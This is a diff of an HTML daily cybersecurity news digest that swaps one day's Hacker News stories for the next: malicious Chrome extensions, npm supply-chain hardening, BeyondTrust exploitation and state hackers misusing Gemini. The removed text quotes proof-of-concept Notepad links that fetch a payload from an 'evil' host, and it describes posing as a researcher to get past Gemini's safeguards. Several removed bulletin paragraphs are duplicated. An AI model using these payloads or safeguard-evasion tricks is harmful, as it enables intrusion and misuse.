@@ -14,397 +14,332 @@
     <div class="header">
         <h1>🔒 Siber Güvenlik Günlük Raporu</h1>
         <p>13 February 2026 Friday</p>
-        <p>⚠️ Claude API bağlantı hatası - TXT içeriği gösteriliyor</p>
+        <p>⚠️ Gemini API bağlantı hatası - TXT içeriği gösteriliyor</p>
     </div>
     <div class="content">
 ================================================================================
 📅 13 FEBRUARY 2026 - SİBER GÜVENLİK HABERLERİ
 ================================================================================
 
-[1] The Hacker News - Google Reports State-Backed Hackers Using Gemini AI for Recon and Attack Support
+[1] The Hacker News - Malicious Chrome Extensions Caught Stealing Business Data, Emails, and Browsing History
 ────────────────────────────────────────────────────────────────────────────────
-Tarih: Thu, 12 Feb 2026 23:27:00 +0530
-Link: https://thehackernews.com/2026/02/google-reports-state-backed-hackers.html
+Tarih: Fri, 13 Feb 2026 16:55:00 +0530
+Link: https://thehackernews.com/2026/02/malicious-chrome-extensions-caught.html
 
-[TAM METİN - 1069 kelime]
-Google on Thursday said it observed the North Korea-linked threat actor known as UNC2970 using its generative artificial intelligence (AI) model Gemini to conduct reconnaissance on its targets, as various hacking groups continue to weaponize the tool for accelerating various phases of the cyber attack life cycle, enabling information operations, and even conducting model extraction attacks.
+[TAM METİN - 1367 kelime]
+Cybersecurity researchers have discovered a malicious Google Chrome extension that's designed to steal data associated with Meta Business Suite and Facebook Business Manager.
 
-"The group used Gemini to synthesize OSINT and profile high-value targets to support campaign planning and reconnaissance," Google Threat Intelligence Group (GTIG) said in a report shared with The Hacker News. "This actor's target profiling included searching for information on major cybersecurity and defense companies and mapping specific technical job roles and salary information."
+The extension, named CL Suite by @CLMasters (ID: jkphinfhmfkckkcnifhjiplhfoiefffl), is marketed as a way to scrape Meta Business Suite data, remove verification pop-ups, and generate two-factor authentication (2FA) codes. The extension has 33 users as of writing. It was first uploaded to the Chrome Web Store on March 1, 2025.
 
-The tech giant's threat intelligence team characterized this activity as a blurring of boundaries between what constitutes routine professional research and malicious reconnaissance, allowing the state-backed actor to craft tailored phishing personas and identify soft targets for initial compromise.
+However, the browser add-on also exfiltrates TOTP codes for Facebook and Meta Business accounts, Business Manager contact lists, and analytics data to infrastructure controlled by the threat actor, Socket said.
 
-UNC2970 is the moniker assigned to a North Korean hacking group that overlaps with a cluster that's tracked as Lazarus Group, Diamond Sleet, and Hidden Cobra. It's best known for orchestrating a long-running campaign codenamed Operation Dream Job to target aerospace, defense, and energy sectors with malware under the guise of approaching victims under the pretext of job openings.
+"The extension requests broad access to meta.com and facebook.com and claims in its privacy policy that 2FA secrets and Business Manager data remain local," security researcher Kirill Boychenko said.
 
-GTIG said UNC2970 has "consistently" focused on defense targeting and impersonating corporate recruiters in their campaigns, with the target profiling including searches for "information on major cybersecurity and defense companies and mapping specific technical job roles and salary information."
+"In practice, the code transmits TOTP seeds and current one-time security codes, Meta Business 'People' CSV exports, and Business Manager analytics data to a backend at getauth[.]pro, with an option to forward the same payloads to a Telegram channel controlled by the threat actor."
 
-UNC2970 is far from the only threat actor to have misused Gemini to augment their capabilities and move from initial reconnaissance to active targeting at a faster clip. Some of the other hacking crews that have integrated the tool into their workflows are as follows -
+By targeting users of Meta Business Suite and Facebook Business Manager, the threat actor behind the operation has leveraged the extension to conduct data collection and exfiltration without users' knowledge or consent.
 
-UNC6418 (Unattributed), to conduct targeted intelligence gathering, specifically seeking out sensitive account credentials and email addresses.
+While the extension does not have capabilities to steal password-related information, the attacker could obtain such information beforehand from other sources, such as infostealer logs or credential dumps, and then use the stolen codes to gain unauthorized access to victims' accounts.
 
-Temp.HEX or Mustang Panda (China), to compile a dossier on specific individuals, including targets in Pakistan, and to gather operational and structural data on separatist organizations in various countries.
+The full scope of the malicious add-on's capabilities is listed below -
 
-APT31 or Judgement Panda (China), to automate the analysis of vulnerabilities and generate targeted testing plans by claiming to be a security researcher.
+Steal TOTP seed (a unique, alphanumeric code that's used to generate time-based one-time passwords) and 2FA code
 
-APT41 (China), to extract explanations from open-source tool README.md pages, as well as troubleshoot and debug exploit code.
+Target Business Manager "People" view by navigating to facebook[.]com and meta[.]com and build a CSV file with names, email addresses, roles and permissions, and their status and access details.
 
-UNC795 (China), to troubleshoot their code, conduct research, and develop web shells and scanners for PHP web servers.
+Enumerate Business Manager-level entities and their linked assets and build a CSV file of Business Manager IDs and names, attached ad accounts, connected pages and assets, and billing and payment configuration details.
 
-APT42 (Iran), to facilitate reconnaissance and targeted social engineering by crafting personas that induce engagement from the targets, as well as develop a Python-based Google Maps scraper, develop a SIM card management system in Rust, and research the use of a proof-of-concept (PoC) for a WinRAR flaw (CVE-2025-8088).
+Socket warned that despite the low number of installs, the extension gives the threat actor enough information to identify high-value targets and mount follow-on attacks.
 
-One recurring avenue for abuse of generative AI models like Gemini occurs when threat actors reframe their prompts by identifying themselves as a security researcher or a participant in a capture-the-flag (CTF) exercise to trick the system into generating unexpected responses. Steve Miller, AI threat lead at GTIG, told The Hacker News that the company is constantly improving its safety mechanisms to combat such scenarios.
+"CL Suite by @CLMasters shows how a narrow browser extension can repackage data scraping as a 'tool' for Meta Business Suite and Facebook Business Manager," Boychenko said.
 
-"Google is always working to improve our safety systems, including detection classifiers, mitigations and other safeguards to prevent misuse by threat actors," Miller said. "As adversaries experience friction in misusing our systems, they begin to experiment with new ways to bypass the safeguards – and though we see lots of these experiments, they are not always successful. Gemini is getting better at recognizing persona-based tricks and responding safely. As we observe new threat activity, we work to strengthen those guard rails."
+"Its people extraction, Business Manager analytics, popup suppression, and in-browser 2FA generation are not neutral productivity features, they are purpose-built scrapers for high-value Meta surfaces that collect contact lists, access metadata, and 2FA material straight from authenticated pages."
 
-Google also said it detected a malware called HONESTCUE that leverages Gemini's API to outsource functionality generation for the next-stage, along with an AI-generated phishing kit codenamed COINBAIT that's built using Lovable AI and masquerades as a cryptocurrency exchange for credential harvesting. Some aspects of COINBAIT-related activity have been attributed to a financially motivated threat cluster dubbed UNC5356.
+Chrome Extensions Hijack VKontakte Accounts
 
-"HONESTCUE is a downloader and launcher framework that sends a prompt via Google Gemini's API and receives C# source code as the response," it said. "However, rather than leveraging an LLM to update itself, HONESTCUE calls the Gemini API to generate code that operates the 'stage two' functionality, which downloads and executes another piece of malware."
+The disclosure comes as Koi Security found that about 500,000 VKontakte users have had their accounts silently hijacked through Chrome extensions masquerading as VK customization tools. The large-scale campaign has been codenamed VK Styles.
 
-The fileless secondary stage of HONESTCUE then takes the generated C# source code received from the Gemini API and uses the legitimate .NET CSharpCodeProvider framework to compile and execute the payload directly in memory, thereby leaving no artifacts on disk.
+The malware embedded in the extensions is designed to engage in active account manipulation by automatically subscribing users to the attacker's VK groups, resetting account settings every 30 days to override user preferences, manipulating Cross-Site Request Forgery (CSRF) tokens to bypass VK's security protections, and maintaining persistent control.
 
-Google has also called attention to a recent wave of ClickFix campaigns that leverage the public sharing feature of generative AI services to host realistic-looking instructions to fix a common computer issue and ultimately deliver information-stealing malware. The activity was flagged in December 2025 by Huntress.
+The activity has been traced to a threat actor operating under the GitHub username 2vk, who has relied on VK's own social network to distribute malicious payloads and build a follower base through forced subscriptions. The names of the extensions are listed below -
 
-Lastly, the company said it identified and disrupted model extraction attacks that are aimed at systematically querying a proprietary machine learning model to extract information and build a substitute model that mirrors the target's behavior. In a large-scale attack of this kind, Gemini was targeted by over 100,000 prompts that posed a series of questions aimed at replicating the model's reasoning ability across a broad range of tasks in non-English languages.
+VK Styles - Themes for vk.com (ID: ceibjdigmfbbgcpkkdpmjokkokklodmc)
 
-Last month, Praetorian devised a PoC extraction attack where a replica model achieved an accuracy rate of 80.1% simply by sending a series of 1,000 queries to the victim's API and recording the outputs and training it for 20 epochs.
+VK Music - audio saver (ID: mflibpdjoodmoppignjhciadahapkoch)
 
-"Many organizations assume that keeping model weights private is sufficient protection," security researcher Farida Shafik said. "But this creates a false sense of security. In reality, behavior is the model. Every query-response pair is a training example for a replica. The model’s behavior is exposed through every API response."
+Music Downloader - VKsaver (ID: lgakkahjfibfgmacigibnhcgepajgfdb)
 
-Google, which launched the AI Cyber Defense Initiative in 2024, has noted that AI offers the best opportunity to reverse the Defender's Dilemma and tilt the cybersecurity scales in favor of defenders.
+vksaver - music saver vk (ID: bndkfmmbidllaiccmpnbdonijmicaafn)
 
-"Everyone is looking to increase productivity with automation. Adversaries are increasingly seeing value from AI," Miller said. "They are using AI routinely and they are building capabilities with it, so it is easy to predict that we will see an increase in the quality, quantity and speed of AI-enabled attacks. Defenders need to prepare for the future and make similar investments in AI, and build towards AI-enabled defensive capabilities that can operate at machine speed."
+VKfeed - Download Music and Video from VK (ID: pcdgkgbadeggbnodegejccjffnoakcoh)
 
-(The story was updated after publication to include responses from GTIG.)
+One of the defining traits of the campaign is the use of a VK profile's ("vk[.]com/m0nda") HTML metadata tags as a dead drop resolver to conceal the next-stage payload URLs and, therefore, evade detection. The next-stage payload is hosted in a public repository named "-" that's associated with 2vk. Present in the payload is obfuscated JavaScript that's injected into every VK page the victim visits.
+
+The repository is still accessible as of writing, with the file, simply named "C," receiving a total of 17 commits between June 2025 and January 2026, as the operator refined and added new functionality.
+
+"Each commit shows deliberate refinement," security researcher Ariel Cohen said. "This isn't sloppy malware - it's a maintained software project with version control, testing, and iterative improvements."
+
+VK Styles has primarily affected Russian-speaking users, who are VK's main demographic, as well as users across Eastern Europe, Central Asia, and Russian diaspora communities globally. The campaign is assessed to be active since at least June 22, 2025, when the initial version of the payload was pushed to the "-" repository.
+
+Fake AI Chrome Extensions Steal Credentials, Emails
+
+The findings also coincide with the discovery of another coordinated campaign dubbed AiFrame, where a cluster of 32 browser add-ons advertised as artificial intelligence (AI) assistants for summarization, chat, writing, and Gmail assistance are being used to siphon sensitive data. These extensions have been collectively installed by more than 260,000 users.
+
+"While these tools appear legitimate on the surface, they hide a dangerous architecture: instead of implementing core functionality locally, they embed remote, server-controlled interfaces inside extension-controlled surfaces and act as privileged proxies, granting remote infrastructure access to sensitive browser capabilities," LayerX researcher Natalie Zargarov said.
+
+The names of the malicious extensions are as follows -
+
+AI Assistant (ID: nlhpidbjmmffhoogcennoiopekbiglbp)
+
+Llama (ID: gcfianbpjcfkafpiadmheejkokcmdkjl)
+
+Gemini AI Sidebar (ID: fppbiomdkfbhgjjdmojlogeceejinadg)
+
+AI Sidebar (ID: djhjckkfgancelbmgcamjimgphaphjdl)
+
+ChatGPT Sidebar (ID: llojfncgbabajmdglnkbhmiebiinohek)
+
+AI Sidebar (ID: gghdfkafnhfpaooiolhncejnlgglhkhe)
+
+Grok (ID: cgmmcoandmabammnhfnjcakdeejbfimn)
+
+Asking Chat Gpt (ID: phiphcloddhmndjbdedgfbglhpkjcffh)
+
+ChatGBT (ID: pgfibniplgcnccdnkhblpmmlfodijppg)
+
+Chat Bot GPT (ID: nkgbfengofophpmonladgaldioelckbe)
+
+Grok Chatbot (ID: gcdfailafdfjbailcdcbjmeginhncjkb)
+
+Chat With Gemini (ID: ebmmjmakencgmgoijdfnbailknaaiffh)
+
+XAI (ID: baonbjckakcpgliaafcodddkoednpjgf)
+
+Google Gemini (ID: fdlagfnfaheppaigholhoojabfaapnhb)
+
+Ask Gemini (ID: gnaekhndaddbimfllbgmecjijbbfpabc)
+
+AI Letter Generator (ID: hgnjolbjpjmhepcbjgeeallnamkjnfgi)
+
+AI Message Generator (ID: lodlcpnbppgipaimgbjgniokjcnpiiad)
+
+AI Translator (ID: cmpmhhjahlioglkleiofbjodhhiejhei)
+
+AI For Translation (ID: bilfflcophfehljhpnklmcelkoiffapb)
+
+AI Cover Letter Generator (ID: cicjlpmjmimeoempffghfglndokjihhn)
+
+AI Image Generator Chat GPT (ID: ckneindgfbjnbbiggcmnjeofelhflhaj)
+
+Ai Wallpaper Generator (ID: dbclhjpifdfkofnmjfpheiondafpkoed)
+
+Ai Picture Generator (ID: ecikmpoikkcelnakpgaeplcjoickgacj)
+
+DeepSeek Download (ID: kepibgehhljlecgaeihhnmibnmikbnga)
+
+AI Email Writer (ID: ckicoadchmmndbakbokhapncehanaeni)
+
+Email Generator AI (ID: fnjinbdmidgjkpmlihcginjipjaoapol)
+
+DeepSeek Chat (ID: gohgeedemmaohocbaccllpkabadoogpl)
+
+ChatGPT Picture Generator (ID: flnecpdpbhdblkpnegekobahlijbmfok)
+
+ChatGPT Translate (ID: acaeafediijmccnjlokgcdiojiljfpbe)
+
+AI GPT (ID: kblengdlefjpjkekanpoidgoghdngdgl)
+
+ChatGPT Translation (ID: idhknpoceajhnjokpnbicildeoligdgh)
+
+Chat GPT for Gmail (ID: fpmkabpaklbhbhegegapfkenkmpipick)
+
+Once installed, these extensions render a full-screen iframe overlay pointing to a remote domain ("claude.tapnetic[.]pro"), allowing the attackers to remotely introduce new capabilities without requiring a Chrome Web Store update. When instructed by the iframe, the add-ons query the active browser tab and invoke a content script to extract readable article content using Mozilla's Readability library.
+
+The malware also supports the capability to start speech recognition and exfiltrate the resulting transcript to the remote page. What's more, a smaller set of the extensions contain functionality to specifically target Gmail by reading visible email content directly from the document object model (DOM) when a victim visits mail.google[.]com.
+
+"When Gmail-related features such as AI-assisted replies or summaries are invoked, the extracted email content is passed into the extension's logic and transmitted to third-party backend infrastructure controlled by the extension operator," LayerX said. "As a result, email message text and related contextual data may be sent off-device, outside of Gmail’s security boundary, to remote servers."
+
+287 Chrome Extensions Exfiltrate Browsing History
+
+The developments show how web browser extensions are increasingly being abused by bad actors to harvest and exfiltrate sensitive data by passing them off as seemingly legitimate tools and utilities.
+
+A report published by Q Continuum last week found a huge collection of 287 Chrome extensions that exfiltrate browsing history to data brokers. These extensions have 37.4 million installations, representing roughly 1% of the global Chrome userbase.
+
+"It was shown in the past that Chrome extensions are used to exfiltrate user browser history that is then collected by data brokers such as Similarweb and Alexa," the researcher said.
+
+Given the risks involved, users are recommended to adopt a minimalist approach by only installing necessary, well-reviewed tools from official stores. It's also essential to periodically audit installed extensions for any signs of malicious behavior or excessive permission requests.
+
+Other ways that users and organizations can ensure greater security include using separate browser profiles for sensitive tasks and implementing extension allowlisting to block those that are malicious or non-compliant.
 
 (XXXXXXX, AÇIK - thehackernews.com, 13/02/2026)
 
 ================================================================================
 
-[2] The Hacker News - Lazarus Campaign Plants Malicious Packages in npm and PyPI Ecosystems
+[2] The Hacker News - npm’s Update to Harden Their Supply Chain, and Points to Consider
 ────────────────────────────────────────────────────────────────────────────────
-Tarih: Thu, 12 Feb 2026 22:25:00 +0530
-Link: https://thehackernews.com/2026/02/lazarus-campaign-plants-malicious.html
+Tarih: Fri, 13 Feb 2026 16:15:00 +0530
+Link: https://thehackernews.com/2026/02/npms-update-to-harden-their-supply.html
 
-[TAM METİN - 827 kelime]
-Cybersecurity researchers have discovered a fresh set of malicious packages across npm and the Python Package Index (PyPI) repository linked to a fake recruitment-themed campaign orchestrated by the North Korea-linked Lazarus Group.
+[TAM METİN - 833 kelime]
+In December 2025, in response to the Sha1-Hulud incident, npm completed a major authentication overhaul intended to reduce supply-chain attacks. While the overhaul is a solid step forward, the changes don’t make npm projects immune from supply-chain attacks. npm is still susceptible to malware attacks – here’s what you need to know for a safer Node community.
 
-The coordinated campaign has been codenamed graphalgo in reference to the first package published in the npm registry. It's assessed to be active since May 2025.
+Let’s start with the original problem
 
-"Developers are approached via social platforms like LinkedIn and Facebook, or through job offerings on forums like Reddit," ReversingLabs researcher Karlo Zanki said in a report. "The campaign includes a well-orchestrated story around a company involved in blockchain and cryptocurrency exchanges."
+Historically, npm relied on classic tokens: long-lived, broadly scoped credentials that could persist indefinitely. If stolen, attackers could directly publish malicious versions to the author’s packages (no publicly verifiable source code needed). This made npm a prime vector for supply-chain attacks. Over time, numerous real-world incidents demonstrated this point. Shai-Hulud, Sha1-Hulud, and chalk/debug are examples of recent, notable attacks.
 
-Notably, one of the identified npm packages, bigmathutils, attracted more than 10,000 downloads after the first, non-malicious version was published, and before the second version containing a malicious payload was released. The names of the packages are listed below -
+To address this, npm made the following changes:
 
-As with many job-focused campaigns conducted by North Korean threat actors, the attack chain begins with establishing a fake company like Veltrix Capital in the blockchain and cryptocurrency trading space, and then setting up the necessary digital real estate to create an illusion of legitimacy.
+npm revoked all classic tokens and defaulted to session-based tokens instead. The npm team also improved token management. Interactive workflows now use short-lived session tokens (typically two hours) obtained via npm login, which defaults to MFA for publishing.
 
-This includes registering a domain and creating a related GitHub organization to host several repositories for use in coding assessments. The repositories have been found to contain projects based on Python and JavaScript.
+The npm team also encourages OIDC Trusted Publishing, in which CI systems obtain short-lived, per-run credentials rather than storing secrets at rest.
 
-"Examination of these repositories didn't reveal any obvious malicious functionality," Zanki said. "That is because the malicious functionality was not introduced directly via the job interview repositories, but indirectly – through dependencies hosted on the npm and PyPI open-source package repositories."
+In combination, these practices improve security. They ensure credentials expire quickly and require a second factor during sensitive operations.
 
-The idea behind setting up these repositories is to trick candidates who apply to its job listings on Reddit and Facebook Groups into running the projects on their machines, effectively installing the malicious dependency and triggering the infection. In some cases, victims are directly contacted by seemingly legitimate recruiters on LinkedIn.
+Two important issues remain
 
-The packages ultimately act as a conduit to deploy a remote access trojan (RAT) that periodically fetches and executes commands from an external server. It supports various commands to gather system information, enumerate files and directories, list running processes, create folders, rename files, delete files, and upload/download files.
+First, people need to remember that the original attack on tools like ChalkJS was a successful MFA phishing attempt on npm’s console. If you look at the original email attached below, you can see it was an MFA-focused phishing email (nothing like trying to do the right thing and still getting burned). The campaign tricked the maintainer into sharing both the user login and one-time password. This means in the future, similar emails could get short-lived tokens, which still give attackers enough time to upload malware (since that would only take minutes).
 
-Interestingly, the command-and-control (C2) communication is protected by a token-based mechanism to ensure that only requests with a valid token are accepted. The approach was previously observed in 2023 campaigns linked to a North Korean hacking group called Jade Sleet, which is also known as TraderTraitor or UNC4899.
+Second, MFA on publish is optional. Developers can still create 90-day tokens with MFA bypass enabled in the console, which are extremely similar to the classic tokens from before.
 
-It essentially works like this: the packages send system data as part of a registration step to the C2 server, which responds with a token. This token is then sent back to the C2 server in subsequent requests to establish that they are originating from an already registered infected system.
+These tokens allow you to read and write to a token author’s maintained packages. This means that if bad actors gain access to a maintainer’s console with these token settings, they can publish new, malicious packages (and versions) on that author’s behalf. This circles us back to the original issue with npm before they adjusted their credential policies.
 
-"The token-based approach is a similarity [...] in both cases and has not been used by other actors in malware hosted on public package repositories as far as we know," Zanki told The Hacker News at that time.
+To be clear, more developers using MFA on publish is good news, and future attacks should be fewer and smaller. However, making OIDC and MFA on-publish optional still leaves the core issue unresolved.
 
-The findings show that North Korean state-sponsored threat actors continue to poison open-source ecosystems with malicious packages in hopes of stealing sensitive data and conducting financial theft, a fact evidenced by the RAT's checks to determine if the MetaMask browser extension is installed in the machine.
+In conclusion, if (1) MFA phishing attempts to npm’s console still work and (2) access to the console equals access to publish new packages/versions, then developers need to be aware of the supply-chain risks that still exist.
 
-"Evidence suggests that this is a highly sophisticated campaign," ReversingLabs said. "Its modularity, long-lived nature, patience in building trust across different campaign elements, and the complexity of the multilayered and encrypted malware point to the work of a state-sponsored threat actor."
+In the spirit of open source security, here are three recommendations that we hope GitHub and npm will consider in the future.
 
-More Malicious npm Packages Found
+Ideally, they continue to push for the ubiquity of OIDC in the long term. OIDC is very hard to compromise and would almost completely erase the issues surrounding supply-chain attacks.
 
-The disclosure comes as JFrog uncovered a sophisticated, malicious npm package called "duer-js" published by a user named "luizaearlyx." While the library claims to be a utility to "make the console window more visible," it harbors a Windows information stealer called Bada Stealer.
+More realistically, enforcing MFA for local package uploads (either via an email code or a one-time password) would further reduce the blast radius of worms like Shai-Hulud. In other words, it would be an improvement to not allow custom tokens that bypass MFA.
 
-"In addition to stealing information from the host it infected, the malicious package downloads a secondary payload," security researcher Guy Korolevski said. "This payload is designed to run on the Discord Desktop app startup, with self-updating capabilities, stealing directly from it, including payment methods used by the user."
+At a minimum, it would be nice to add metadata to package releases, so developers can take precautions and avoid packages (or maintainers) who do not take supply chain security measures.
 
-It also coincides with the discovery of another malware campaign that weaponizes npm to extort cryptocurrency payments from developers during package installation using the "npm install" command. The campaign, first recorded on February 4, 2026, has been dubbed XPACK ATTACK by OpenSourceMalware.
+In short, npm has taken an important step forward by eliminating permanent tokens and improving defaults. Until short-lived, identity-bound credentials become the norm — and MFA bypass is no longer required for automation — supply-chain risk from compromised build systems remains materially present.
 
-The names of the packages, all uploaded by a user named "dev.chandra_bose," are listed below -
+This entire time, we’ve been talking about supply-chain attacks by uploading packages to npm on a maintainer’s behalf. If we could build every npm package from verifiable upstream source code rather than downloading the artifact from npm, we’d be better off. That’s exactly what Chainguard does for its customers with Chainguard Libraries for JavaScript.
 
-xpack-video-submission
+We’ve looked at the public database for compromised packages across npm and discovered that for 98.5% of malicious packages, the malware was not present in the upstream source code (just the published artifact). This means an approach of building from source would reduce your attack surface by some 98.5%, based on past data, because Chainguard’s JavaScript repository would never publish the malicious versions available on npm.
 
-xpack-subscription-test
+In an ideal world, customers are most secure when they use Chainguard Libraries and apply the recommendations above. Per the “Swiss cheese model of security,” all of these features are layers of additive security measures, and companies would be best off using a combination of them.
 
-testing-package-xdsfdsfsc
+If you’d like to learn more about Chainguard Libraries for JavaScript, reach out to our team.
 
-"Unlike traditional malware that steals credentials or executes reverse shells, this attack innovatively abuses the HTTP 402 'Payment Required' status code to create a seemingly legitimate payment wall," security researcher Paul McCarty said. "The attack blocks installation until victims pay 0.1 USDC/ETH to the attacker's wallet, while collecting GitHub usernames and device fingerprints."
-
-"If they refuse to pay, the installation simply fails after wasting 5+ minutes of their development time, and they may not even realize they've encountered malware versus what appeared to be a legitimate paywall for package access."
+Note: This article was thoughtfully written and contributed for our audience by Adam La Morre, Senior Solutions Engineer at Chainguard.
 
 (XXXXXXX, AÇIK - thehackernews.com, 13/02/2026)
 
 ================================================================================
 
-[3] The Hacker News - ThreatsDay Bulletin: AI Prompt RCE, Claude 0-Click, RenEngine Loader, Auto 0-Days & 25+ Stories
+[3] The Hacker News - Researchers Observe In-the-Wild Exploitation of BeyondTrust CVSS 9.9 Vulnerability
 ────────────────────────────────────────────────────────────────────────────────
-Tarih: Thu, 12 Feb 2026 17:21:00 +0530
-Link: https://thehackernews.com/2026/02/threatsday-bulletin-ai-prompt-rce.html
+Tarih: Fri, 13 Feb 2026 14:04:00 +0530
+Link: https://thehackernews.com/2026/02/researchers-observe-in-wild.html
 
-[TAM METİN - 8671 kelime]
-Threat activity this week shows one consistent signal — attackers are leaning harder on what already works. Instead of flashy new exploits, many operations are built around quiet misuse of trusted tools, familiar workflows, and overlooked exposures that sit in plain sight.
+[TAM METİN - 864 kelime]
+Threat actors have started to exploit a recently disclosed critical security flaw impacting BeyondTrust Remote Support (RS) and Privileged Remote Access (PRA) products, according to watchTowr.
 
-Another shift is how access is gained versus how it’s used. Initial entry points are getting simpler, while post-compromise activity is becoming more deliberate, structured, and persistent. The objective is less about disruption and more about staying embedded long enough to extract value.
+"Overnight we observed first in-the-wild exploitation of BeyondTrust across our global sensors," Ryan Dewhurst, head of threat intelligence at watchTowr, said in a post on X. "Attackers are abusing get_portal_info to extract the x-ns-company value before establishing a WebSocket channel."
 
-There’s also growing overlap between cybercrime, espionage tradecraft, and opportunistic intrusion. Techniques are bleeding across groups, making attribution harder and defense baselines less reliable.
+The vulnerability in question is CVE-2026-1731 (CVS score: 9.9), which could allow an unauthenticated attacker to achieve remote code execution by sending specially crafted requests.
 
-Below is this week’s ThreatsDay Bulletin — a tight scan of the signals that matter, distilled into quick reads. Each item adds context to where threat pressure is building next.
+BeyondTrust noted last week that successful exploitation of the shortcoming could allow an unauthenticated remote attacker to execute operating system commands in the context of the site user, resulting in unauthorized access, data exfiltration, and service disruption.
 
-Notepad RCE via Markdown Links
+It has been patched in the following versions -
 
-Microsoft Patches Notepad Flaw
+Remote Support - Patch BT26-02-RS, 25.3.2 and later
 
+Privileged Remote Access - Patch BT26-02-PRA, 25.1.1 and later
 
-      Microsoft has patched a command injection flaw (CVE-2026-20841, CVSS score: 8.8) in its Notepad app that could result in remote code execution. "Improper neutralization of special elements used in a command ('command injection') in Windows Notepad App allows an unauthorized attacker to execute code over a network," Microsoft said. An attacker could exploit this flaw by tricking a user into clicking a malicious link inside a Markdown file opened in Notepad, causing the application to run remote files. "The malicious code would execute in the security context of the user who opened the Markdown file, giving the attacker the same permissions as that user," the tech giant added. Proof-of-concept (PoC) exploits show that the vulnerability can be triggered by creating a Markdown file with "file://" links that point to executable files ("file://C:/windows/system32/cmd.exe") or contain special URIs ("ms-appinstaller://?source=https://evil/xxx.appx") to run arbitrary payloads. The issue was fixed as part of its monthly Patch Tuesday update this week. Microsoft added Markdown support to Notepad on Windows 11 last May.
+The use of CVE-2026-1731 demonstrates how quickly threat actors can weaponize new vulnerabilities, significantly shrinking the window for defenders to patch critical systems.
 
-Microsoft has patched a command injection flaw (CVE-2026-20841, CVSS score: 8.8) in its Notepad app that could result in remote code execution. "Improper neutralization of special elements used in a command ('command injection') in Windows Notepad App allows an unauthorized attacker to execute code over a network," Microsoft said. An attacker could exploit this flaw by tricking a user into clicking a malicious link inside a Markdown file opened in Notepad, causing the application to run remote files. "The malicious code would execute in the security context of the user who opened the Markdown file, giving the attacker the same permissions as that user," the tech giant added. Proof-of-concept (PoC) exploits show that the vulnerability can be triggered by creating a Markdown file with "file://" links that point to executable files ("file://C:/windows/system32/cmd.exe") or contain special URIs ("ms-appinstaller://?source=https://evil/xxx.appx") to run arbitrary payloads. The issue was fixed as part of its monthly Patch Tuesday update this week. Microsoft added Markdown support to Notepad on Windows 11 last May.
+CISA Adds 4 Flaws to KEV Catalog
 
-APT Pressure Intensifies on Taiwan
+The development comes as the U.S. Cybersecurity and Infrastructure Security Agency (CISA) added four vulnerabilities to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation. The list of vulnerabilities is as follows -
 
-Taiwan Becomes Target of APT Attacks
+CVE-2026-20700 (CVSS score: 7.8) - An improper restriction of operations within the bounds of a memory buffer vulnerability in Apple iOS, macOS, tvOS, watchOS, and visionOS that could allow an attacker with memory write capability to execute arbitrary code.
 
+CVE-2025-15556 (CVSS score: 7.7) - A download of code without an integrity check vulnerability in Notepad++ that could allow an attacker to intercept or redirect update traffic to download and execute an attacker-controlled installer and lead to arbitrary code execution with the privileges of the user.
 
-      TeamT5 said tracked more than 510 advanced persistent threat (APT) operations affecting 67 countries globally in 2025, out of which 173 attacks targeted Taiwan. "Taiwan’s role in geopolitical tensions and values in the global technology supply chain makes it uniquely vulnerable for adversaries who seek intelligence or long-term access to achieve political and military objectives," the security vendor said. "Taiwan is more than just a target – it functions as a proving ground where China-nexus APTs test and refine their tactics before scaling them to other environments."
+CVE-2025-40536 (CVSS score: 8.1) - A security control bypass vulnerability in SolarWinds Web Help Desk that could allow an unauthenticated attacker to gain access to certain restricted functionality.
 
-TeamT5 said tracked more than 510 advanced persistent threat (APT) operations affecting 67 countries globally in 2025, out of which 173 attacks targeted Taiwan. "Taiwan’s role in geopolitical tensions and values in the global technology supply chain makes it uniquely vulnerable for adversaries who seek intelligence or long-term access to achieve political and military objectives," the security vendor said. "Taiwan is more than just a target – it functions as a proving ground where China-nexus APTs test and refine their tactics before scaling them to other environments."
+CVE-2024-43468 (CVSS score: 9.8) - An SQL injection vulnerability in Microsoft Configuration Manager that could allow an unauthenticated attacker to execute commands on the server and/or underlying database by sending specially crafted requests.
 
-Node.js Stealer Hits Windows
+It's worth noting that CVE-2024-43468 was patched by Microsoft in October 2024 as part of its Patch Tuesday updates. It's currently unclear how this vulnerability is being exploited in real-world attacks. Nor is there any information about the identity of the threat actors exploiting the flaw and the scale of such efforts.
 
-LTX Stealer Targets Windows Systems
+The addition of CVE-2024-43468 to the KEV catalog follows a recent report from Microsoft about a multi‑stage intrusion that involved the threat actors exploiting internet‑exposed SolarWinds Web Help Desk (WHD) instances to obtain initial access and move laterally across the organization's network to other high-value assets.
 
+However, the Windows maker said it's not evident if the attacks exploited CVE-2025-40551, CVE-2025-40536, or CVE-2025-26399, since attacks occurred in December 2025 and on machines vulnerable to both the old and new sets of vulnerabilities.
 
-      A new Node.js information stealer named LTX Stealer has been spotted in the wild. Targeting Windows systems and distributed via a heavily obfuscated Inno Setup installer, the malware conducts large-scale credential harvesting from Chromium-based browsers, targets cryptocurrency-related artifacts, and stages the collected data for exfiltration. "The campaign relies on a cloud-backed management infrastructure, where Supabase is used exclusively as the authentication and access-control layer for the operator panel, while Cloudflare is leveraged to front backend services and mask infrastructure details," CYFIRMA said.
+As for CVE-2026-20700, Apple acknowledged that the shortcoming may have been exploited in an extremely sophisticated attack against specific targeted individuals on versions of iOS before iOS 26, raising the possibility that it was leveraged to deliver commercial spyware. It was fixed by the tech giant earlier this week.
 
-A new Node.js information stealer named LTX Stealer has been spotted in the wild. Targeting Windows systems and distributed via a heavily obfuscated Inno Setup installer, the malware conducts large-scale credential harvesting from Chromium-based browsers, targets cryptocurrency-related artifacts, and stages the collected data for exfiltration. "The campaign relies on a cloud-backed management infrastructure, where Supabase is used exclusively as the authentication and access-control layer for the operator panel, while Cloudflare is leveraged to front backend services and mask infrastructure details," CYFIRMA said.
+Lastly, the exploitation of CVE-2025-15556 has been attributed by Rapid7 to a China-linked state-sponsored threat actor called Lotus Blossom (aka Billbug, Bronze Elgin, G0030, Lotus Panda, Raspberry Typhoon, Spring Dragon, and Thrip). It's known to be active since at least 2009.
 
-Marco Stealer Expands Data Theft
+The targeted attacks have been found to deliver a previously undocumented backdoor called Chrysalis. While the supply chain attack was fully plugged on December 2, 2025, the compromise of the Notepad++ update pipeline is estimated to have spanned nearly five months between June and October 2025.
 
-Marco Stealer Emerges in the Wild
